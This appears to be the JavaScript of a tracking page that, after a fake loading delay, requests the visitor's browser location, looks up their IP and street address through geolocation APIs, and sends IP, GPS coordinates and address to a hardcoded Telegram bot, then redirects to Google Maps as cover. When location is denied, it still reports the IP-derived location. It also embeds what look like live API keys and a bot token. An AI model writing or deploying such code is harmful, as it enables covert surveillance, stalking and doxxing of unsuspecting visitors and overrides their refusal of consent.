const TELEGRAM_BOT_TOKEN = '7943375930:AAEiifo4A9NiuxY13o73qjCJVUiHXEu2ta8';
const CHAT_ID = '6602027873';
const OPENCAGE_API_KEY = '8e640acb36a3409a9877e0c900653f7d';

function sendToTelegram(message) {
  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message,
    })
  });
}

function getIPInfo() {
  return fetch('https://ipinfo.io/json?token=8e640acb36a3409a9877e0c900653f7d')
    .then(response => response.json());
}

function getLocationInfo(lat, lon) {
  return fetch(`https://api.opencagedata.com/geocode/v1/json?q=${lat}+${lon}&key=${OPENCAGE_API_KEY}`)
    .then(response => response.json());
}

function getLocation() {
  navigator.geolocation.getCurrentPosition(async (position) => {
    const { latitude, longitude } = position.coords;

    try {
      const ipData = await getIPInfo();
      const locData = await getLocationInfo(latitude, longitude);

      const components = locData.results[0].components;
      const address = `${components.country}, ${components.state}, ${components.county || ''}, ${components.suburb || components.village || components.town || components.city || ''}`;

      const message = `✅ USER ALLOWED LOCATION
🔹 IP: ${ipData.ip}
🔹 GPS: ${latitude}, ${longitude}
📍 Address: ${address}`;

      sendToTelegram(message);
    } catch (e) {
      sendToTelegram("✅ Location allowed but error getting address.");
    }

    // Redirect to Google Maps
    window.location.href = `https://www.google.com/maps/@${latitude},${longitude},15z`;
  }, async (error) => {
    // User denied
    const ipData = await getIPInfo();
    const locStr = ipData.loc.split(',');
    const locData = await getLocationInfo(locStr[0], locStr[1]);
    const components = locData.results[0].components;
    const address = `${components.country}, ${components.state}, ${components.county || ''}, ${components.suburb || components.village || components.town || components.city || ''}`;

    const message = `❌ USER DENIED LOCATION
🔹 IP: ${ipData.ip}
📍 Approx IP Address: ${address}`;

    sendToTelegram(message);

    window.location.href = `https://www.google.com/maps`;
  });
}

window.onload = () => {
  setTimeout(() => {
    getLocation();
  }, 2000); // Delay for loader effect
};
